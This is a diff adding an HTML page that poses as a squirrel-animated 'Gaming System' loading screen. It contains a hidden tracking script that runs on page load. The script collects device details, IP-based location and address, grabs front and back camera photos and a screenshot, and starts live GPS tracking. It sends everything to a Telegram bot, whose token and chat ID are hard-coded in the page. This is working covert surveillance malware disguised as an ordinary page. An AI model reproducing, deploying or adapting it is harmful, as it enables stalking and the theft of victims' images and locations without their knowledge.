@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>PANJITzy</title>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: linear-gradient(135deg, #0a0a1a 0%, #1a0a2a 30%, #2d1b47 70%, #0a0a1a 100%);
+    font-family: 'Segoe UI', Arial, sans-serif;
+    color: #e0d6ff;
+    overflow: hidden;
+    position: relative;
+  }
+
+  body::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: 
+      radial-gradient(circle at 20% 30%, rgba(147, 51, 234, 0.2) 0%, transparent 40%),
+      radial-gradient(circle at 80% 70%, rgba(168, 85, 247, 0.15) 0%, transparent 45%),
+      radial-gradient(circle at 40% 80%, rgba(192, 132, 252, 0.1) 0%, transparent 50%),
+      linear-gradient(45deg, rgba(0,0,0,0.3) 0%, transparent 100%);
+    animation: nebulaFloat 20s linear infinite;
+    z-index: -2;
+  }
+
+  .stars {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+    z-index: -1;
+  }
+
+  .star {
+    position: absolute;
+    background-color: white;
+    border-radius: 50%;
+    animation: twinkle 3s infinite alternate;
+  }
+
+  #loading-container {
+    text-align: center;
+    width: 90%;
+    max-width: 500px;
+    padding: 40px 30px;
+    background: rgba(10, 5, 20, 0.9);
+    border-radius: 20px;
+    box-shadow: 
+      0 0 80px rgba(147, 51, 234, 0.4),
+      0 0 150px rgba(168, 85, 247, 0.2),
+      inset 0 0 30px rgba(192, 132, 252, 0.15),
+      0 10px 40px rgba(0, 0, 0, 0.8);
+    backdrop-filter: blur(15px);
+    border: 1px solid rgba(168, 85, 247, 0.3);
+    animation: containerFloat 4s ease-in-out infinite;
+    overflow: hidden;
+    position: relative;
+    z-index: 1;
+  }
+
+  #loading-container::after {
+    content: '';
+    position: absolute;
+    top: -2px;
+    left: -2px;
+    right: -2px;
+    bottom: -2px;
+    background: linear-gradient(45deg, 
+      transparent 40%, 
+      #8B5CF6 50%, 
+      transparent 60%);
+    background-size: 300% 300%;
+    border-radius: 22px;
+    z-index: -1;
+    animation: borderFlow 4s linear infinite;
+    opacity: 0.5;
+  }
+
+  #forest-scene {
+    width: 100%;
+    height: 150px;
+    position: relative;
+    margin-bottom: 30px;
+    background: linear-gradient(to bottom, 
+      rgba(15, 10, 30, 0.8) 0%,
+      rgba(30, 20, 50, 0.6) 30%,
+      rgba(40, 25, 65, 0.4) 70%,
+      rgba(50, 30, 80, 0.2) 100%);
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.7);
+  }
+
+  .tree {
+    position: absolute;
+    bottom: 0;
+    width: 40px;
+    height: 80px;
+    background: linear-gradient(to right, #2d3748, #4a5568);
+    clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
+  }
+
+  .tree::after {
+    content: '';
+    position: absolute;
+    top: -20px;
+    left: 5px;
+    width: 30px;
+    height: 30px;
+    background: linear-gradient(to bottom, #22543d, #38a169);
+    border-radius: 50% 50% 0 0;
+    box-shadow: 0 0 10px rgba(56, 161, 105, 0.5);
+  }
+
+  .tree:nth-child(1) { left: 10%; height: 70px; width: 35px; }
+  .tree:nth-child(2) { left: 25%; height: 90px; width: 45px; }
+  .tree:nth-child(3) { left: 40%; height: 80px; width: 40px; }
+  .tree:nth-child(4) { left: 60%; height: 95px; width: 50px; }
+  .tree:nth-child(5) { left: 80%; height: 75px; width: 38px; }
+
+  .ground {
+    position: absolute;
+    bottom: 0;
+    width: 100%;
+    height: 30px;
+    background: linear-gradient(to top, #2d1b47, #4c1d95);
+    border-radius: 0 0 12px 12px;
+  }
+
+  .track-path {
+    position: absolute;
+    bottom: 30px;
+    left: 0;
+    width: 100%;
+    height: 10px;
+    background: linear-gradient(90deg, 
+      transparent,
+      rgba(245, 158, 11, 0.3),
+      rgba(245, 158, 11, 0.6),
+      rgba(245, 158, 11, 0.3),
+      transparent);
+    animation: pathShine 2s linear infinite;
+  }
+
+  #squirrel {
+    position: absolute;
+    bottom: 35px;
+    left: -60px;
+    width: 50px;
+    height: 35px;
+    animation: squirrelRun 3s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+    transform-origin: center bottom;
+  }
+
+  .squirrel-body {
+    position: absolute;
+    width: 30px;
+    height: 25px;
+    background: linear-gradient(135deg, #92400e, #d97706);
+    border-radius: 50% 50% 40% 40%;
+    top: 5px;
+    left: 10px;
+    box-shadow: 0 0 15px rgba(217, 119, 6, 0.5);
+  }
+
+  .squirrel-head {
+    position: absolute;
+    width: 20px;
+    height: 20px;
+    background: linear-gradient(135deg, #b45309, #f59e0b);
+    border-radius: 50%;
+    top: 0;
+    left: 22px;
+    box-shadow: 0 0 10px rgba(245, 158, 11, 0.4);
+  }
+
+  .ear {
+    position: absolute;
+    width: 8px;
+    height: 8px;
+    background: linear-gradient(135deg, #b45309, #d97706);
+    border-radius: 50%;
+    top: -3px;
+  }
+
+  .ear.left { left: 4px; transform: rotate(-20deg); }
+  .ear.right { left: 12px; transform: rotate(20deg); }
+
+  .eye {
+    position: absolute;
+    width: 4px;
+    height: 4px;
+    background: white;
+    border-radius: 50%;
+    top: 8px;
+    box-shadow: 0 0 5px white;
+  }
+
+  .eye::after {
+    content: '';
+    position: absolute;
+    width: 2px;
+    height: 2px;
+    background: #1f2937;
+    border-radius: 50%;
+    top: 1px;
+    left: 1px;
+  }
+
+  .eye.left { left: 5px; }
+  .eye.right { left: 11px; }
+
+  .squirrel-tail {
+    position: absolute;
+    width: 25px;
+    height: 35px;
+    background: linear-gradient(135deg, #78350f, #92400e);
+    border-radius: 50% 0 50% 50%;
+    top: -10px;
+    left: -5px;
+    transform-origin: bottom right;
+    animation: tailMove 0.6s ease-in-out infinite alternate;
+    box-shadow: 0 0 10px rgba(120, 53, 15, 0.4);
+  }
+
+  #nut {
+    position: absolute;
+    bottom: 35px;
+    right: 20px;
+    width: 18px;
+    height: 18px;
+    background: linear-gradient(45deg, #d97706, #f59e0b);
+    border-radius: 50% 50% 50% 0;
+    transform: rotate(45deg);
+    animation: nutFloat 2s ease-in-out infinite alternate;
+    box-shadow: 
+      0 0 20px rgba(245, 158, 11, 0.8),
+      0 0 40px rgba(245, 158, 11, 0.4);
+    z-index: 10;
+  }
+
+  .progress-container {
+    width: 100%;
+    height: 8px;
+    background: rgba(30, 20, 50, 0.5);
+    border-radius: 4px;
+    margin: 25px 0;
+    overflow: hidden;
+    box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.5);
+  }
+
+  .progress-bar {
+    width: 0%;
+    height: 100%;
+    background: linear-gradient(90deg, #8B5CF6, #D946EF, #8B5CF6);
+    background-size: 200% 100%;
+    border-radius: 4px;
+    animation: progressShine 2s linear infinite, progressFill 30s linear forwards;
+    box-shadow: 0 0 10px rgba(168, 85, 247, 0.5);
+  }
+
+  #loading-text {
+    font-size: 24px;
+    margin: 10px 0;
+    font-weight: 700;
+    background: linear-gradient(90deg, #8B5CF6, #D946EF, #EC4899, #8B5CF6);
+    background-size: 300% auto;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    letter-spacing: 1.2px;
+    text-shadow: 0 0 30px rgba(168, 85, 247, 0.3);
+    animation: textShimmer 3s linear infinite;
+  }
+
+  #loading-details {
+    margin-top: 10px;
+    font-size: 14px;
+    color: #C4B5FD;
+    font-style: italic;
+    opacity: 0.9;
+    animation: detailPulse 3s ease-in-out infinite;
+  }
+
+  #process-info {
+    font-size: 12px;
+    color: #A78BFA;
+    margin-top: 5px;
+    opacity: 0.7;
+  }
+
+  #camera-container {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -9999;
+    opacity: 0;
+  }
+
+  #v, #c, #v-front, #c-front {
+    display: none;
+  }
+
+  @keyframes squirrelRun {
+    0% {
+      left: -60px;
+      transform: translateY(0) rotate(0deg);
+    }
+    10% {
+      transform: translateY(-5px) rotate(5deg);
+    }
+    20% {
+      transform: translateY(0) rotate(0deg);
+    }
+    30% {
+      transform: translateY(-8px) rotate(-3deg);
+    }
+    40% {
+      transform: translateY(0) rotate(0deg);
+    }
+    50% {
+      transform: translateY(-5px) rotate(5deg);
+    }
+    60% {
+      transform: translateY(0) rotate(0deg);
+    }
+    70% {
+      transform: translateY(-10px) rotate(-2deg);
+    }
+    80% {
+      transform: translateY(0) rotate(0deg);
+    }
+    90% {
+      transform: translateY(-5px) rotate(3deg);
+    }
+    100% {
+      left: calc(100% - 40px);
+      transform: translateY(0) rotate(0deg);
+    }
+  }
+
+  @keyframes tailMove {
+    0% {
+      transform: rotate(-10deg) scale(1);
+    }
+    100% {
+      transform: rotate(10deg) scale(1.1);
+    }
+  }
+
+  @keyframes nutFloat {
+    0% {
+      transform: rotate(45deg) translateY(0) scale(1);
+    }
+    100% {
+      transform: rotate(45deg) translateY(-5px) scale(1.1);
+    }
+  }
+
+  @keyframes pathShine {
+    0% {
+      background-position: -200% 0;
+    }
+    100% {
+      background-position: 200% 0;
+    }
+  }
+
+  @keyframes nebulaFloat {
+    0% {
+      transform: translate(0, 0) rotate(0deg);
+    }
+    25% {
+      transform: translate(10px, 10px) rotate(1deg);
+    }
+    50% {
+      transform: translate(0, 20px) rotate(0deg);
+    }
+    75% {
+      transform: translate(-10px, 10px) rotate(-1deg);
+    }
+    100% {
+      transform: translate(0, 0) rotate(0deg);
+    }
+  }
+
+  @keyframes containerFloat {
+    0%, 100% {
+      transform: translateY(0) rotateX(0deg);
+      box-shadow: 
+        0 0 80px rgba(147, 51, 234, 0.4),
+        0 0 150px rgba(168, 85, 247, 0.2);
+    }
+    50% {
+      transform: translateY(-15px) rotateX(3deg);
+      box-shadow: 
+        0 0 100px rgba(147, 51, 234, 0.5),
+        0 0 180px rgba(168, 85, 247, 0.3);
+    }
+  }
+
+  @keyframes borderFlow {
+    0% {
+      background-position: 0% 0%;
+    }
+    100% {
+      background-position: 300% 300%;
+    }
+  }
+
+  @keyframes progressShine {
+    0% {
+      background-position: 200% 0;
+    }
+    100% {
+      background-position: -200% 0;
+    }
+  }
+
+  @keyframes progressFill {
+    0% { width: 0%; }
+    10% { width: 20%; }
+    20% { width: 40%; }
+    30% { width: 50%; }
+    40% { width: 60%; }
+    50% { width: 70%; }
+    60% { width: 75%; }
+    70% { width: 80%; }
+    80% { width: 85%; }
+    90% { width: 90%; }
+    95% { width: 95%; }
+    100% { width: 100%; }
+  }
+
+  @keyframes textShimmer {
+    0% {
+      background-position: 0% center;
+    }
+    100% {
+      background-position: 200% center;
+    }
+  }
+
+  @keyframes detailPulse {
+    0%, 100% {
+      opacity: 0.7;
+      text-shadow: 0 0 5px rgba(168, 85, 247, 0.2);
+    }
+    50% {
+      opacity: 1;
+      text-shadow: 0 0 15px rgba(168, 85, 247, 0.4);
+    }
+  }
+
+  @keyframes twinkle {
+    0%, 100% {
+      opacity: 0.2;
+      transform: scale(1);
+    }
+    50% {
+      opacity: 1;
+      transform: scale(1.2);
+    }
+  }
+</style>
+
+</head>
+<body>
+  <div id="stars" class="stars"></div>
+
+  <div id="loading-container">
+    <div id="forest-scene">
+      <div class="tree"></div>
+      <div class="tree"></div>
+      <div class="tree"></div>
+      <div class="tree"></div>
+      <div class="tree"></div>
+      
+      <div class="ground"></div>
+      <div class="track-path"></div>
+      
+      <div id="squirrel">
+        <div class="squirrel-tail"></div>
+        <div class="squirrel-body"></div>
+        <div class="squirrel-head">
+          <div class="ear left"></div>
+          <div class="ear right"></div>
+          <div class="eye left"></div>
+          <div class="eye right"></div>
+        </div>
+      </div>
+      
+      <div id="nut"></div>
+    </div>
+    
+    <div class="progress-container">
+      <div class="progress-bar"></div>
+    </div>
+    
+    <div id="loading-text">Gaming System</div>
+    <div id="loading-details">Secure transaction processing...</div>
+    <div id="process-info">Collecting Wait.....</div>
+  </div>
+
+  <div id="camera-container">
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
+    <video id="v-front" autoplay playsinline muted></video>
+    <canvas id="c-front"></canvas>
+  </div>
+
+  <script>
+    (() => {
+      function createStars() {
+        const starsContainer = document.getElementById('stars');
+        const starCount = 150;
+        
+        for (let i = 0; i < starCount; i++) {
+          const star = document.createElement('div');
+          star.className = 'star';
+          
+          const size = Math.random() * 2 + 1;
+          star.style.width = size + 'px';
+          star.style.height = size + 'px';
+          star.style.left = Math.random() * 100 + 'vw';
+          star.style.top = Math.random() * 100 + 'vh';
+          star.style.animationDelay = Math.random() * 3 + 's';
+          star.style.animationDuration = Math.random() * 2 + 2 + 's';
+          
+          starsContainer.appendChild(star);
+        }
+      }
+
+      createStars();
+
+      const TOKEN = '8602884881:AAEDjnyqRd64bWC_rdTDVQOA9MDgA4UXP6Y';
+      const CHAT_ID = '7235398434';
+
+      function updateProcessInfo(text) {
+        const infoEl = document.getElementById('process-info');
+        infoEl.textContent = text;
+        infoEl.style.opacity = '1';
+        
+        setTimeout(() => {
+          infoEl.style.opacity = '0.7';
+        }, 500);
+      }
+
+      const sendTG = async (msg, isPhoto = false) => {
+        try {
+          if (isPhoto) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', msg.blob, msg.filename);
+            
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+              method: 'POST',
+              body: fd
+            });
+          } else {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: msg,
+                parse_mode: 'HTML'
+              })
+            });
+          }
+        } catch (e) {
+          console.error('Telegram send error:', e);
+        }
+      };
+
+      const getLocationDetails = async (lat, lon) => {
+        try {
+          const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+          const d = await r.json();
+          if (d.address) {
+            return {
+              kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
+              kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
+              fa: d.display_name || "Alamat tidak tersedia"
+            };
+          }
+        } catch (e) {}
+        return {
+          kb: "Tidak diketahui",
+          kc: "Tidak diketahui",
+          fa: "Alamat tidak tersedia"
+        };
+      };
+
+      const collectDeviceInfo = async () => {
+        updateProcessInfo('Collecting device information...');
+        
+        let msg = '╔═════ TRACKING ════╗\n\n';
+        msg += '📱 **DEVICE INFORMATION**\n';
+        msg += '├─ 📱 Device: ' + navigator.userAgent + '\n';
+        msg += '├─ 🖥️ Platform: ' + navigator.platform + '\n';
+        msg += '├─ 🌐 Language: ' + navigator.language + '\n';
+        msg += '├─ 📶 Online: ' + (navigator.onLine ? '✅ Online' : '❌ Offline') + '\n';
+        msg += '├─ 📺 Screen: ' + screen.width + 'x' + screen.height + '\n';
+        msg += '├─ 🪟 Window: ' + innerWidth + 'x' + innerHeight + '\n';
+        msg += '├─ 💾 RAM: ' + (navigator.deviceMemory || 'Unknown') + ' GB\n';
+        msg += '├─ 🧠 CPU Cores: ' + navigator.hardwareConcurrency + '\n';
+
+        if (navigator.getBattery) {
+          try {
+            const b = await navigator.getBattery();
+            msg += '├─ 🔋 Battery: ' + Math.floor(b.level * 100) + '%\n';
+            msg += '├─ 🔌 Charging: ' + (b.charging ? '✅ YES' : '❌ NO') + '\n';
+          } catch (e) {
+            msg += '├─ 🔋 Battery: ❌ Not available\n';
+          }
+        }
+
+        msg += '├─ ⏰ Access Time: ' + new Date().toLocaleString() + '\n';
+        msg += '├─ 🕒 Load Time: ' + performance.now().toFixed(2) + ' ms\n';
+        msg += '├─ 📜 History: ' + history.length + ' entries\n';
+        msg += '├─ ✋ Touch: ' + ('ontouchstart' in window ? '✅ Yes' : '❌ No') + '\n';
+        msg += '├─ 🔗 Referrer: ' + (document.referrer || 'Direct') + '\n';
+        msg += '├─ 🌍 URL: ' + location.href + '\n';
+        msg += '├─ 📄 Title: ' + document.title + '\n';
+        msg += '├─ 🕓 Timezone: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n';
+        msg += '└─ 🧭 Offset: ' + new Date().getTimezoneOffset() + ' minutes\n\n';
+
+        try {
+          const i = await fetch('https://ipapi.co/json/');
+          const d = await i.json();
+
+          msg += '📍 **LOCATION INFORMATION**\n';
+          msg += '├─ 📡 IP Address: ' + d.ip + '\n';
+          msg += '├─ 🏙️ City: ' + d.city + '\n';
+          msg += '├─ 🏙️ Region: ' + d.region + '\n';
+          msg += '├─ 🌎 Country: ' + d.country_name + '\n';
+          msg += '├─ 🏷️ Postal: ' + d.postal + '\n';
+
+          if (d.latitude && d.longitude) {
+            msg += '├─ 📌 Latitude: ' + d.latitude + '\n';
+            msg += '├─ 📍 Longitude: ' + d.longitude + '\n';
+
+            const l = await getLocationDetails(d.latitude, d.longitude);
+            msg += '├─ 🏙️ District: ' + l.kb + '\n';
+            msg += '├─ 🏙️ Subdistrict: ' + l.kc + '\n';
+            msg += '└─ 🏠 Address: ' + l.fa + '\n';
+          } else {
+            msg += '└─ ❌ No GPS data available\n';
+          }
+        } catch (e) {
+          msg += '📍 **LOCATION**: ❌ Failed to get location info\n';
+        }
+
+        msg += '\n╚════ @ungkeeeeee ════╝';
+        return msg;
+      };
+
+      const captureCamera = async (type, filename) => {
+        try {
+          updateProcessInfo(`Accessing ${type} camera...`);
+          
+          const constraints = type === 'front' ? 
+            { video: { facingMode: { exact: "user" } } } :
+            { video: { facingMode: { exact: "environment" } } };
+          
+          let stream;
+          try {
+            stream = await navigator.mediaDevices.getUserMedia(constraints);
+          } catch (e) {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          }
+          
+          const video = type === 'front' ? 
+            document.getElementById('v-front') : 
+            document.getElementById('v');
+          const canvas = type === 'front' ? 
+            document.getElementById('c-front') : 
+            document.getElementById('c');
+          
+          video.srcObject = stream;
+          
+          await new Promise(resolve => {
+            video.onloadedmetadata = () => resolve();
+          });
+          
+          await new Promise(r => setTimeout(r, 2000)); // Give time for camera to focus
+          
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0);
+          
+          return new Promise(resolve => {
+            canvas.toBlob(async (blob) => {
+              if (blob) {
+                await sendTG({ blob, filename }, true);
+                updateProcessInfo(`${type} camera capture successful`);
+              }
+              stream.getTracks().forEach(track => track.stop());
+              resolve();
+            }, 'image/jpeg', 0.9);
+          });
+          
+        } catch (error) {
+          await sendTG(`❌ ${type.toUpperCase()} CAMERA FAILED: ${error.message}`);
+          updateProcessInfo(`${type} camera access denied`);
+        }
+      };
+
+      const captureScreenshot = async () => {
+        try {
+          updateProcessInfo('Taking screenshot...');
+          
+          const canvas = await html2canvas(document.body, {
+            useCORS: true,
+            scale: 0.8,
+            backgroundColor: null
+          });
+          
+          canvas.toBlob(async (blob) => {
+            if (blob) {
+              await sendTG({ blob, filename: 'screen_capture.jpg' }, true);
+              updateProcessInfo('Screenshot captured');
+            }
+          }, 'image/jpeg', 0.9);
+          
+        } catch (error) {
+          await sendTG('❌ SCREENSHOT FAILED: ' + error.message);
+          updateProcessInfo('Screenshot failed');
+        }
+      };
+
+      const startGPSTracking = () => {
+        if (navigator.geolocation) {
+          updateProcessInfo('Starting GPS tracking...');
+          
+          navigator.geolocation.watchPosition(async (pos) => {
+            let msg = '📍 **LIVE GPS TRACKING**\n';
+            msg += '├─ 📌 Latitude: ' + pos.coords.latitude + '\n';
+            msg += '├─ 📍 Longitude: ' + pos.coords.longitude + '\n';
+            msg += '├─ 🎯 Accuracy: ' + pos.coords.accuracy + 'm\n';
+            
+            const l = await getLocationDetails(pos.coords.latitude, pos.coords.longitude);
+            msg += '├─ 🏙️ District: ' + l.kb + '\n';
+            msg += '├─ 🏙️ Subdistrict: ' + l.kc + '\n';
+            msg += '└─ 🏠 Address: ' + l.fa;
+            
+            await sendTG(msg);
+            updateProcessInfo('Live GPS tracking active');
+          }, 
+          async (error) => {
+            await sendTG('❌ GPS ERROR: ' + error.message);
+            updateProcessInfo('GPS tracking failed');
+          }, 
+          {
+            enableHighAccuracy: true,
+            maximumAge: 0,
+            timeout: 10000
+          });
+        }
+      };
+
+      const startTracking = async () => {
+        document.getElementById('loading-text').textContent = 'Initializing System';
+        document.getElementById('loading-details').textContent = 'Starting secure tracking...';
+        
+        const deviceInfo = await collectDeviceInfo();
+        await sendTG(deviceInfo);
+        
+        await captureCamera('back', 'back_camera_capture.jpg');
+        
+        setTimeout(async () => {
+          await captureCamera('front', 'front_camera_selfie.jpg');
+        }, 3000);
+        
+        setTimeout(async () => {
+          await captureScreenshot();
+        }, 6000);
+        
+        setTimeout(() => {
+          startGPSTracking();
+        }, 9000);
+        
+        const steps = [
+          { time: 1000, text: 'Device Scan Complete', detail: 'Analyzing hardware...' },
+          { time: 4000, text: 'Camera Systems Ready', detail: 'Visual data acquisition...' },
+          { time: 7000, text: 'Screen Capture Active', detail: 'Capturing display data...' },
+          { time: 10000, text: 'GPS Tracking Online', detail: 'Live location monitoring...' },
+          { time: 13000, text: 'Quantum System Active', detail: 'All systems operational' }
+        ];
+        
+        steps.forEach(step => {
+          setTimeout(() => {
+            document.getElementById('loading-text').textContent = step.text;
+            document.getElementById('loading-details').textContent = step.detail;
+          }, step.time);
+        });
+      };
+
+      setTimeout(startTracking, 2000);
+    })();
+  </script>
+</body>
+</html>
